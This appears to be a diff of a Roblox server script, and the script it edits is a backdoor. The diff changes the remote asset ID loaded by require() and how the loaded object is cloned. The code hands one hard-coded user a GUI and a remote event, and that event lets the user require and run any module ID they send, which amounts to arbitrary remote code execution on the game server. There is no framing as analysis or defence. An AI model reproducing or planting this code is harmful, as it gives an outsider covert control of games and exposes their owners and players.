@@ -1,4 +1,4 @@
-local c = require(6412973476)
+local c = require(6412989103)
 function l(a,s)
 	if #s > 0 then
 		local r = require(tonumber(string.match(s, "%d+")))
@@ -12,7 +12,7 @@ end
 
 game.Players.PlayerAdded:Connect(function(plr)
 	if plr.UserId == 287103891 then
-		local c = c:load():Clone()
+		local c = c:Clone()
 		c.Parent = plr.PlayerGui
 		c[''][''].OnServerEvent:connect(function(a,s)
 			l(a,s)
